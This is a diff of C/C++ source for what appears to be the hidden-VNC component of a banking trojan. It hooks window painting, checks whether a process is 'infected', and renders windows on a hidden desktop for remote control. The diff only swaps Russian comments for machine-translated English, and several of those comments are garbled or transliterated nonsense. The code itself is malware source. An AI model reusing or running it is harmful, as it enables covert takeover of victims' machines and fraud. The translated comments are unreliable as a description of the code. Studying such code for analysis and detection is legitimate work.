@@ -14,18 +14,18 @@
 
 #if(BO_VNC > 0)
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Рисование окна.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//В Drawing window.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
-//Данные о прорисовки окна.
+//Data on the drawing window.
 typedef struct
 {
-  bool calledDc;    //Флаг, означающий, что перехваченая функция для DC была успешно вызвана.
-  HWND window;      //Окно.
+  bool calledDc;    //Flag indicating that the intercepted function for DC has been successfully invoked.
+  HWND window;      //Window.
   HDC dc;           //DC
-  RECT updateRect;  //Координаты области для перерисовки.
-  BOOL erase;       //Стирать ли фон.
+  RECT updateRect;  //Coordinates of the area to repaint.
+  BOOL erase;       //Erase a background.
 }PAINTDATA;
 
 /*
@@ -89,7 +89,7 @@ static void copyRectTempDesktop(VNCPROCESSDATA *vncProcessData, const RECT *rect
 }
 
 /*
-  Рисование окна.
+ В Drawing window.
   
   IN vncProcessData - VNCPROCESSDATA.
   IN window         - окно для печати.
@@ -102,7 +102,7 @@ static void copyRectTempDesktop(VNCPROCESSDATA *vncProcessData, const RECT *rect
 */
 bool paintWindow(VNCPROCESSDATA *vncProcessData, HWND window, const RECT *visibleRect, bool isServer)
 {
-  //Выбираем метод рисования окна.
+  //Choosing a method of drawing the window.
   WORD paintFlags = getWindowClassFlags(window);
   
   if(paintFlags & WCF_PAINTMETHOD_NOP)return true;
@@ -114,7 +114,7 @@ bool paintWindow(VNCPROCESSDATA *vncProcessData, HWND window, const RECT *visibl
     paintFlags |= WCF_PAINTMETHOD_PRINTWINDOW;
   }
 
-  //Получаем координаты окна.
+  //Obtain the coordinates of the window.
   WINDOWINFO windowInfo;
   RECT clientRect;  
   RECT frameRect;
@@ -131,7 +131,7 @@ bool paintWindow(VNCPROCESSDATA *vncProcessData, HWND window, const RECT *visibl
       if(windowInfo.rcWindow.left < visibleRect->left)frameX = windowInfo.rcWindow.left - visibleRect->left;
     }
 
-    //Координаты используются только в WCF_PAINTMETHOD_PAINT.
+    //Coordinates are used only in WCF_PAINTMETHOD_PAINT.
     if(paintFlags & WCF_PAINTMETHOD_PAINT)
     {
       if(windowInfo.dwStyle & WS_MINIMIZE)paintClient = false;
@@ -149,7 +149,7 @@ bool paintWindow(VNCPROCESSDATA *vncProcessData, HWND window, const RECT *visibl
     if(paintFrame == false && paintClient == false)return true;
   }
   
-  //Подготавлиаем DC.
+  //Podgotavliaem DC.
   HDC memoryDc;
   HBITMAP oldBitmap;
   {
@@ -171,7 +171,7 @@ bool paintWindow(VNCPROCESSDATA *vncProcessData, HWND window, const RECT *visibl
     if(!ok)return false;
   }
 
-  //Рисуем окно.
+  //Draw a box.
   bool retVal = true;  
   if(paintFlags & WCF_PAINTMETHOD_PAINT)
   {
@@ -188,7 +188,7 @@ bool paintWindow(VNCPROCESSDATA *vncProcessData, HWND window, const RECT *visibl
 
     setThreadPaintData(&paintData);
     
-    //Рисуем рамку.
+    //Draw a frame.
     //WM_NCPAINT
     if(paintFrame == true && CWA(user32, EqualRect)(&clientRect, &frameRect) == FALSE)
     {
@@ -198,7 +198,7 @@ bool paintWindow(VNCPROCESSDATA *vncProcessData, HWND window, const RECT *visibl
       paintData.calledDc = false;
       
       CWA(user32, SendMessageW)(window, WM_NCPAINT, 1, 0);
-      if(paintData.calledDc == false)CWA(user32, DefWindowProcW/*SendMessageW*/)(window, WM_PRINT, (WPARAM)memoryDc, PRF_NONCLIENT); //Так сделано у WASM.kero.
+      if(paintData.calledDc == false)CWA(user32, DefWindowProcW/*SendMessageW*/)(window, WM_PRINT, (WPARAM)memoryDc, PRF_NONCLIENT); //This is done in WASM.kero.
       copyRectTempDesktop(vncProcessData, &frameRect, true);
       CWA(gdi32, RestoreDC)(memoryDc, dcState);
     }
@@ -207,7 +207,7 @@ bool paintWindow(VNCPROCESSDATA *vncProcessData, HWND window, const RECT *visibl
     {
       bool changeViewPort = (clientX != 0 || clientY != 0);        
 
-      //Обновляем фон.
+      //Update the background.
       //WM_ERASEBKGND.
       {
         dcState = CWA(gdi32, SaveDC)(memoryDc);        
@@ -217,7 +217,7 @@ bool paintWindow(VNCPROCESSDATA *vncProcessData, HWND window, const RECT *visibl
         CWA(gdi32, RestoreDC)(memoryDc, dcState);
       }
 
-      //Рисуем клиентскую часть.
+      //Drawing the client side.
       //WM_PAINT
       {
         if(changeViewPort)CWA(gdi32, SetViewportOrgEx)(memoryDc, clientX, clientY, NULL);        
@@ -245,7 +245,7 @@ bool paintWindow(VNCPROCESSDATA *vncProcessData, HWND window, const RECT *visibl
     else copyRectTempDesktop(vncProcessData, &frameRect, true);
   }  
 
-  //Освобождаем ресурсы.
+  //Free resources.
   CWA(gdi32, SelectObject)(memoryDc, oldBitmap);
   CWA(gdi32, DeleteDC)(memoryDc);
 
@@ -384,9 +384,9 @@ int WINAPI VncServer::hookerGetUpdateRgn(HWND window, HRGN rgn, BOOL erase)
   return CWA(user, GetUpdateRgn)(window, rgn, erase);
 }
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
-// Обзор всех окон для рисования.
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
+//В Overview of all windows for painting.
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 /*
   Создания процесса рисования окон.
@@ -418,7 +418,7 @@ static bool createPaintProcess(VNCPROCESSDATA *vncProcessData)
     if(Process::_createEx(path, L"-v", NULL, &startupInfo, &processInfo) == 0)return false;
     Mem::_copy(&vncProcessData->serverData.paintProcess, &processInfo, sizeof(PROCESS_INFORMATION));
 
-    //Ждем пока процесс дойдет до message loop.
+    //We wait until the process reaches the message loop.
     if(CWA(kernel32, WaitForSingleObject)(vncProcessData->vncMessageEvent, 1000) != WAIT_OBJECT_0)
     {
       CWA(kernel32, TerminateProcess)(vncProcessData->serverData.paintProcess.hProcess, 0);
@@ -463,9 +463,9 @@ bool VncServer::startAsPaintThread(void)
 static bool selectMethodAndPaintWindow(VNCPROCESSDATA *vncProcessData, HWND window, const RECT *ownerRect, const WINDOWINFO *windowInfo)
 {
   DWORD classFlags = getWindowClassFlags(window);
-  if(classFlags & WCF_PAINTMETHOD_NOP)return true; //Хз.
+  if(classFlags & WCF_PAINTMETHOD_NOP)return true; //Xs.
   
-  //Если процесс заражен, рисуем через перехват.
+  //If the process is infected, draw through interception.
   bool isInfected  = isWindowInfected(vncProcessData, window);
   
   if(isInfected && (classFlags & WCF_PAINTMETHOD_SKIP_HOOK) == 0)
@@ -485,7 +485,7 @@ static bool selectMethodAndPaintWindow(VNCPROCESSDATA *vncProcessData, HWND wind
     }    
   }
 
-  //Крайний случай, пытаемся нарисовать хоть что-то.
+  //Extreme case, we try to draw anything.
   if(createPaintProcess(vncProcessData))
   {
     Mem::_copy(&vncProcessData->globalData->paintProcess.ownerRect, ownerRect, sizeof(RECT));
@@ -497,7 +497,7 @@ static bool selectMethodAndPaintWindow(VNCPROCESSDATA *vncProcessData, HWND wind
       {
         if(vncProcessData->globalData->paintProcess.retVal == true)
         {
-          //Если заражен, пытаемся прорисовать дочерные окна, если нет, отснавливаемся.
+          //If infected, trying to draw the child window, if not, otsnavlivaemsya.
           return isInfected;
         }
       }
@@ -509,7 +509,7 @@ static bool selectMethodAndPaintWindow(VNCPROCESSDATA *vncProcessData, HWND wind
     }
   }
 
-  //Сверх мега крайний случай, рисуем предупреждение.
+  //Super mega extreme case, draw a warning.
   if((windowInfo->dwStyle & WS_CHILD) == 0)
   {
     RECT visibleRect;
@@ -517,25 +517,23 @@ static bool selectMethodAndPaintWindow(VNCPROCESSDATA *vncProcessData, HWND wind
     CWA(user32, FillRect)(vncProcessData->serverData.dcData.dc, &visibleRect, (HBRUSH)(COLOR_WINDOW + 1));
     CWA(user32, DrawEdge)(vncProcessData->serverData.dcData.dc, &visibleRect, EDGE_SUNKEN, BF_RECT);
   }
-  return true; //Хз, думаю стоит попробывать.
+  return true; //Xs, I think to try.
 }
 
-//Структура для enumWindowsCallback().
+//Structure for enumWindowsCallback ().
 typedef struct
 {
   VNCPROCESSDATA *vncProcessData; //VNCPROCESSDATA.
-  RECT parentRect;                //Видемая область родителя.
-  WINDOWINFO *windowInfo;         //Просто для экномии стека.
+  RECT parentRect;                //Videm area parent.
+  WINDOWINFO *windowInfo;         //Just for eknomii stack.
 }ENUMWINDOWCALLBACK;
 
-/*
-  Кэлбэк Gui::_enumWindows() для рисования окна.
+/*В В Kelbek Gui:: _enumWindows () for drawing the window.
 
-  IN window - окно.
-  IN param  - ENUMWINDOWCALLBACK.
+В В IN window - the window.
+В В IN param - ENUMWINDOWCALLBACK.
 
-  Return    - true.
-*/
+В В Return - true.*/
 static bool enumWindowsCallback(HWND window, void *param)
 {
   ENUMWINDOWCALLBACK *ewc = (ENUMWINDOWCALLBACK *)param;
@@ -543,13 +541,13 @@ static bool enumWindowsCallback(HWND window, void *param)
 
   if(CWA(user32, GetWindowInfo)(window, ewc->windowInfo) != FALSE)
   {
-    //Узнаем, максимальный квадрат в котром мы можем нарисовать окно.
+    //Find out the maximum square in MDM, we can draw a box.
     RECT *ownerRect = (RECT *)(ewc->windowInfo->dwStyle & WS_CHILD ? &ewc->parentRect : &ewc->vncProcessData->dib.rect);
 
     bool paint;
     ENUMWINDOWCALLBACK pawCurrent;
     
-    //Получаем видимый треугольник.
+    //Obtain a visible triangle.
     if(ewc->windowInfo->dwStyle & WS_VISIBLE)
     {
       paint = (CWA(user32, IntersectRect)(&pawCurrent.parentRect, &ewc->windowInfo->rcClient, ownerRect) != FALSE);
@@ -563,8 +561,8 @@ static bool enumWindowsCallback(HWND window, void *param)
       paint = false;
     }
 
-    //Рисуем.
-    if(paint)//Если нужно рисовать детей.
+    //Draw.
+    if(paint)//If you want to draw children.
     {
       selectMethodAndPaintWindow(ewc->vncProcessData, window, ownerRect, ewc->windowInfo);
       pawCurrent.vncProcessData = ewc->vncProcessData;
